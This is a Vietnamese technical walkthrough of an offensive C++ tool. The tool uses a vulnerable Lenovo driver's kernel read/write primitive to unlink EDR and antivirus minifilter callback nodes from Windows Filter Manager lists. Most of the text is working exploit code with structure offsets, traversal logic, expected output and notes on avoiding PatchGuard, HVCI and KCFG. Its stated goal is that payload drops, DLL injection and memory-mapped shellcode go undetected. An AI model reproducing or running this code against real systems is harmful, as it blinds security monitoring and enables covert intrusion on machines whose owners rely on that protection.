# 12 — Minifilter Callback Blind (FLT_VOLUME OperationLists Unlinking)

**File:** `12_minifilter_blind.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Kernel VA read/write (LIST_ENTRY manipulation)  
**Output:** Minifilter drivers (EDR/AV) không còn nhận notification về file I/O operations  
**Based on:** MiniFilter Callback Unlinking (S12/0x12Dark, April 2026)

---

## Mục tiêu

Walk cây cấu trúc nội bộ của Filter Manager (`fltmgr.sys`) và unlink các `CALLBACK_NODE` khỏi `OperationLists` của từng `FLT_VOLUME`. Sau khi unlink, EDR/AV minifilters không nhận file I/O events (create, read, write, directory query, v.v.) → không detect payload drop, DLL injection qua file write, hay memory-mapped shellcode.

---

## Lý thuyết nền

### Kiến trúc Filter Manager

Windows Filter Manager quản lý minifilter drivers theo cây cấu trúc:

```
FltGlobals                    ← global state của fltmgr.sys
  │
  └─ FrameList (LIST_ENTRY)
       │
       ├─ _FLTP_FRAME [0]     ← một "frame" = instance của filter manager
       │    │
       │    └─ VolumeList (LIST_ENTRY)
       │         │
       │         ├─ _FLT_VOLUME [C:]   ← một volume được attach
       │         │    │
       │         │    └─ Callbacks (_CALLBACK_CTRL)
       │         │         │
       │         │         └─ OperationLists[0..49]  ← một list per IRP_MJ_*
       │         │              │
       │         │              ├─ CALLBACK_NODE (EDR callback)
       │         │              └─ CALLBACK_NODE (AV callback)
       │         │
       │         └─ _FLT_VOLUME [D:]
       │              └─ ...
       │
       └─ _FLTP_FRAME [1] (nếu có)
```

### CALLBACK_NODE layout

```
struct CALLBACK_NODE {
    +0x000  CallbackLinks   LIST_ENTRY   ← linked vào OperationLists[irp]
    +0x010  Flags           ULONG
    +0x018  Instance        PFLT_INSTANCE
    +0x020  PreOperation    PFLT_PRE_OPERATION_CALLBACK   ← ĐÂY TA UNLINK
    +0x028  PostOperation   PFLT_POST_OPERATION_CALLBACK
};
```

### Tại sao UNLINK thay vì zero function pointer?

Kỹ thuật cũ (zero fn ptr) bị block bởi **KCFG (Kernel Control Flow Guard)** trên một số build: kernel kiểm tra fn ptr trước khi call → null fn ptr → crash.

S12's April 2026 technique: **unlink node khỏi LIST_ENTRY chain** thay vì patch fn ptr. Kernel không bao giờ thấy node này nữa → không crash → KCFG không relevant.

### Offset structure (stable Win10 19041 → Win11 26100)

```cpp
#define FLTGLOBALS_FrameList_OFFSET    0x0A0   // FltGlobals+0x0A0 = FrameList LIST_ENTRY
#define FLTP_FRAME_VolumeList_OFFSET   0x0A8   // frame_va+0x0A8 = VolumeList LIST_ENTRY
#define FLT_VOLUME_FrameLink_OFFSET    0x010   // vol+0x010 = LIST_ENTRY trong VolumeList
#define FLT_VOLUME_Callbacks_OFFSET    0x198   // vol+0x198 = _CALLBACK_CTRL start
#define CALLBACK_CTRL_OpLists_OFFSET   0x000   // OperationLists bắt đầu tại +0 của _CALLBACK_CTRL
#define CALLBACK_NODE_Links_OFFSET     0x000   // CallbackLinks (LIST_ENTRY) ở đầu node
#define CALLBACK_NODE_Pre_OFFSET       0x020   // PreOperation fn ptr
#define CALLBACK_NODE_Post_OFFSET      0x028   // PostOperation fn ptr
#define NUM_IRP_MAJOR                  50      // IRP_MJ_MAXIMUM_FUNCTION+1
```

---

## Giải thích code từng dòng

### GetFltGlobals() — resolve FltGlobals kernel VA

```cpp
static uint64_t GetFltGlobals(uint64_t cr3, uint64_t fltmgr_base)
{
    // FltGlobals là data symbol exported từ fltmgr.sys
    // Không thể dùng GetNtExport vì cần parse fltmgr exports (không phải ntoskrnl)
    // Giải pháp: load fltmgr.sys vào user space dưới dạng "không link DLL"
    HMODULE hFlt = LoadLibraryExA("fltmgr.sys", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    // DONT_RESOLVE_DLL_REFERENCES: load file vào memory nhưng không chạy DllMain,
    // không resolve imports → safe, nhanh
    
    void *ptr = GetProcAddress(hFlt, "FltGlobals");
    // GetProcAddress tìm trong export table → trả về user-space VA
    
    uint64_t rva = (uint64_t)ptr - (uint64_t)hFlt;
    // RVA = user VA - user load base = offset trong file
    // RVA này là SAME trong kernel vì PE loader map cùng sections
    
    FreeLibrary(hFlt);
    uint64_t va = fltmgr_base + rva;
    // Kernel VA = kernel fltmgr base + RVA
    return va;
}
```

Trick này hoạt động vì Windows PE loader (cả user và kernel) load module với cùng section offsets. RVA luôn nhất quán giữa user-mode và kernel-mode copy của cùng một DLL.

### Đọc fltmgr.sys image size

```cpp
uint8_t fltbuf[0x1000] = {};
KernelRead(cr3, fltmgr_base, fltbuf, sizeof(fltbuf));  // đọc PE header
auto *dos = (IMAGE_DOS_HEADER*)fltbuf;
auto *nt  = (IMAGE_NT_HEADERS64*)(fltbuf + dos->e_lfanew);
uint64_t fltmgr_size = nt->OptionalHeader.SizeOfImage;
```

`SizeOfImage` cần thiết để lọc: skip callback nodes có fn ptr trong range `[fltmgr_base, fltmgr_base+size)` — đây là fltmgr-internal nodes, không phải EDR callbacks.

### UnlinkedNode struct — state để restore

```cpp
struct UnlinkedNode {
    uint64_t node_va;    // VA của CALLBACK_NODE được unlink
    uint64_t prev_va;    // VA của previous LIST_ENTRY (prev node's Flink field)
    uint64_t next_va;    // VA của next LIST_ENTRY (next node's Blink-1's Flink field)
    uint64_t prev_flink; // = next_va (cái ta ghi vào prev->Flink)
    uint64_t next_blink; // = prev_va (cái ta ghi vào next->Blink)
};
static UnlinkedNode g_unlinked[MAX_UNLINKED];  // MAX_UNLINKED = 512
```

### UnlinkNode() — standard LIST_ENTRY unlink

```cpp
static void UnlinkNode(uint64_t cr3, uint64_t node_va,
                        uint64_t prev_le_va, uint64_t next_le_va)
{
    // Standard doubly-linked list unlink:
    // prev->Flink = next
    KernelWriteU64(cr3, prev_le_va, next_le_va);
    // next->Blink = prev
    // Blink là Flink+8, nên next->Blink = next_le_va + 8
    KernelWriteU64(cr3, next_le_va + 8, prev_le_va);
    
    // Point unlinked node về chính nó (clean, empty-list state)
    KernelWriteU64(cr3, node_va,     node_va);   // node->Flink = node
    KernelWriteU64(cr3, node_va + 8, node_va);   // node->Blink = node
    
    // Save for later restore
    if (g_unlinked_count < MAX_UNLINKED) {
        UnlinkedNode &u = g_unlinked[g_unlinked_count++];
        u.node_va    = node_va;
        u.prev_va    = prev_le_va;
        u.next_va    = next_le_va;
        u.prev_flink = next_le_va;
        u.next_blink = prev_le_va;
    }
}
```

4 writes: 2 để link prev↔next, 2 để self-loop node (tránh pointer cũ trỏ về list đã thay đổi).

### ProcessVolume() — walk callback nodes của một volume

```cpp
static int ProcessVolume(uint64_t cr3, uint64_t vol_va,
                          uint64_t fltmgr_base, uint64_t fltmgr_size,
                          bool do_unlink, int vol_idx)
{
    uint64_t cb_ctrl_va = vol_va + FLT_VOLUME_Callbacks_OFFSET;
    // cb_ctrl_va = địa chỉ của _CALLBACK_CTRL struct (+0x198 từ vol start)
    
    for (int irp = 0; irp < NUM_IRP_MAJOR; irp++) {
        // Mỗi OperationList là một LIST_ENTRY (16 bytes = Flink + Blink)
        uint64_t list_head_va = cb_ctrl_va + CALLBACK_CTRL_OpLists_OFFSET + (uint64_t)irp * 16;
        // irp=0 → list_head_va = cb_ctrl_va + 0x000 (IRP_MJ_CREATE callbacks)
        // irp=1 → list_head_va = cb_ctrl_va + 0x010
        // irp=3 → list_head_va = cb_ctrl_va + 0x030 (IRP_MJ_READ callbacks)
        
        uint64_t head_flink = 0;
        if (!KernelReadU64(cr3, list_head_va, &head_flink)) continue;
        if (head_flink == list_head_va) continue;  // empty list, skip
```

### Walk nodes trong một OperationList

```cpp
        uint64_t cur = head_flink;
        uint64_t prev_le_va = list_head_va;  // prev = list head initially
        
        while (cur != list_head_va && node_count < 128) {
            // cur = VA của CALLBACK_NODE.CallbackLinks (LIST_ENTRY = first field)
            // Vì CallbackLinks là field đầu, cur cũng = VA của toàn CALLBACK_NODE
            
            uint64_t pre_fn = 0, post_fn = 0;
            KernelReadU64(cr3, cur + CALLBACK_NODE_Pre_OFFSET,  &pre_fn);   // +0x020
            KernelReadU64(cr3, cur + CALLBACK_NODE_Post_OFFSET, &post_fn);  // +0x028
            
            uint64_t next = 0;
            if (!KernelReadU64(cr3, cur, &next)) break;
            // Đọc Flink của current node (= VA của next node)
```

### Phân loại: fltmgr-internal vs EDR callback

```cpp
            // Callback nằm trong fltmgr.sys range → đây là framework node, skip
            bool pre_in_flt  = (pre_fn  >= fltmgr_base && pre_fn  < fltmgr_base + fltmgr_size);
            bool post_in_flt = (post_fn >= fltmgr_base && post_fn < fltmgr_base + fltmgr_size);
            bool is_kernel_ptr = (pre_fn >> 48) == 0xFFFF || (post_fn >> 48) == 0xFFFF;
            // is_kernel_ptr: tránh xử lý garbage data

            printf("    vol[%d] irp=%02d %-18s  node=0x%016llX  pre=0x%016llX%s  post=0x%016llX%s\n",
                   vol_idx, irp, IrpName(irp), cur,
                   pre_fn,  pre_in_flt  ? "[flt]" : "",
                   post_fn, post_in_flt ? "[flt]" : "");

            if (do_unlink && !pre_in_flt && !post_in_flt && is_kernel_ptr) {
                // Unlink non-fltmgr EDR node
                UnlinkNode(cr3, cur, prev_le_va, next);
                // Sau unlink, prev_le_va không đổi (cur đã bị loại khỏi chain)
                cur = next;
                node_count++;
                continue;
                // Không update prev_le_va vì cur đã bị unlink
            }
            
            prev_le_va = cur;  // advance prev (chỉ khi không unlink)
            cur = next;
```

Logic `prev_le_va`: khi unlink node, ta không cần advance `prev_le_va` vì `prev` vẫn là node trước node bị unlink — nó đã được viết lại để point đến `next`.

### Walk frames và volumes

```cpp
// FrameList head tại FltGlobals+0x0A0
uint64_t frame_list_head_va = flt_globals_va + FLTGLOBALS_FrameList_OFFSET;
uint64_t frame_flink = 0;
KernelReadU64(cr3, frame_list_head_va, &frame_flink);

uint64_t frame_cur = frame_flink;
while (frame_cur != frame_list_head_va && frame_count < 16) {
    uint64_t frame_va = frame_cur;
    // FrameList là LIST_ENTRY tại offset 0x000 của _FLTP_FRAME
    // → frame_cur IS the _FLTP_FRAME VA (first field)

    // VolumeList tại frame+0x0A8
    uint64_t vol_list_head_va = frame_va + FLTP_FRAME_VolumeList_OFFSET;
    uint64_t vol_flink = 0;
    KernelReadU64(cr3, vol_list_head_va, &vol_flink);

    uint64_t vol_cur = vol_flink;
    while (vol_cur != vol_list_head_va && vc < 64) {
        // vol_cur = VA của _FLT_VOLUME.FrameLink.Flink
        // FrameLink là tại +0x010, nên _FLT_VOLUME base = vol_cur - 0x010
        uint64_t vol_va = vol_cur - FLT_VOLUME_FrameLink_OFFSET;
        
        ProcessVolume(cr3, vol_va, fltmgr_base, fltmgr_size, do_unlink, vol_idx);
        
        uint64_t vol_next = 0;
        KernelReadU64(cr3, vol_cur, &vol_next);  // advance qua Flink
        vol_cur = vol_next;
    }
    
    uint64_t frame_next = 0;
    KernelReadU64(cr3, frame_cur, &frame_next);  // advance frame
    frame_cur = frame_next;
}
```

Quan trọng: `vol_cur - FLT_VOLUME_FrameLink_OFFSET` vì VolumeList chứa Flink của `FrameLink` field, không phải Flink của toàn struct. Phải subtract offset để có base address của `_FLT_VOLUME`.

### RestoreAll() — reverse order relinking

```cpp
static void RestoreAll(uint64_t cr3)
{
    // Restore theo reverse order để handle nested dependencies
    for (int i = g_unlinked_count - 1; i >= 0; i--) {
        UnlinkedNode &u = g_unlinked[i];
        
        // Relink: prev->Flink = node, next->Blink = node
        KernelWriteU64(cr3, u.prev_va,        u.node_va);   // prev->Flink = node
        KernelWriteU64(cr3, u.next_va + 8,    u.node_va);   // next->Blink = node
        
        // Restore node's own pointers
        KernelWriteU64(cr3, u.node_va,        u.next_va);   // node->Flink = next
        KernelWriteU64(cr3, u.node_va + 8,    u.prev_va);   // node->Blink = prev
    }
    printf("[+] Restored %d unlinked callback nodes\n", g_unlinked_count);
}
```

Reverse order: nếu nhiều nodes bị unlink từ cùng list, restore theo thứ tự ngược đảm bảo chain được relink đúng.

### IrpName() — tên IRP major functions

```cpp
static const char *IrpName(int i)
{
    static const char *names[] = {
        "CREATE","CREATE_NAMED_PIPE","CLOSE","READ","WRITE","QUERY_INFO",
        "SET_INFO","QUERY_EA","SET_EA","FLUSH","QUERY_VOL_INFO","SET_VOL_INFO",
        "DIR_CTRL","FS_CTRL","DEV_CTRL","INTERNAL_IOCTL","SHUTDOWN",
        "LOCK","CLEANUP","CREATE_MAILSLOT","QUERY_SECURITY","SET_SECURITY",
        "POWER","SYS_CTRL","DEV_CHANGE","QUERY_QUOTA","SET_QUOTA","PNP",
        // 28-49 là ?28..?49 (không có tên chuẩn cho minifilter)
        ...
    };
    return names[i];
}
```

IRP major functions 0-27 có tên; 28-49 ít dùng hơn.

---

## Kết quả expected

```
[+] fltmgr.sys base=0xFFFFF8000AB00000  size=0x91000
[+] FltGlobals VA = 0xFFFFF8000AB65A00  (RVA=0x65A00)

[Frame 0] @ 0xFFFF88001234A000
    [Vol 0] @ 0xFFFF88009ABCD000  (Callbacks @ +0x198)
    vol[0] irp=00 CREATE             node=0xFFFF880012345000  pre=0xFFFF8001EDCB0000  post=0xFFFF8001EDCB1000
    vol[0] irp=00 CREATE             node=0xFFFF880012346000  pre=0xFFFF8000AB123456[flt]  post=0x0000000000000000
    vol[0] irp=03 READ               node=0xFFFF880012347000  pre=0xFFFF8001EDCB2000  post=0x0000000000000000
    ...

[*] Press Enter to UNLINK EDR callback nodes from all volumes...

[+] 15 callback nodes unlinked across all volumes
[+] Minifilter drivers can no longer intercept file I/O:
    - file drops go undetected
    - DLL injection via file write goes undetected
    - memory-mapped payload writes go undetected
```

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| PatchGuard | **Không check** — fltmgr internal data structures |
| HVCI | Không ảnh hưởng — LIST_ENTRY manipulation là data, không code |
| KCFG | **Không relevant** — ta không patch fn ptr, ta unlink nodes |
| Offset thay đổi | Offsets ổn định Win8–Win11 26100; future builds có thể thay đổi |
| Re-attach | Một số EDR có watchdog thread detect và re-attach minifilter |
| fltmgr crash | Chỉ unlink non-fltmgr nodes → framework internal nodes intact |

---

## Tóm tắt flow

```
GetSystemCR3() → cr3
GetModuleBase("fltmgr.sys") → fltmgr_base
KernelRead(fltmgr PE header) → fltmgr_size

GetFltGlobals():
    LoadLibraryEx(fltmgr.sys, DONT_RESOLVE) → hFlt
    GetProcAddress(hFlt, "FltGlobals") → user_va
    RVA = user_va - hFlt
    FltGlobals_kernel_va = fltmgr_base + RVA

Phase 1 (dry run):
    Walk FltGlobals+0x0A0 → frames → volumes → OperationLists → nodes
    Print each non-fltmgr callback node

[User confirms]

Phase 2 (unlink):
    Same walk, do_unlink=true
    For each non-fltmgr node in each IRP list:
        prev->Flink = next
        next->Blink = prev
        node->Flink = node (self-loop)
        node->Blink = node

[+] N nodes unlinked — EDR blind to file I/O

[Press Enter]

RestoreAll() (reverse order):
    For each saved node (i = count-1 down to 0):
        prev->Flink = node
        next->Blink = node
        node->Flink = next
        node->Blink = prev
```
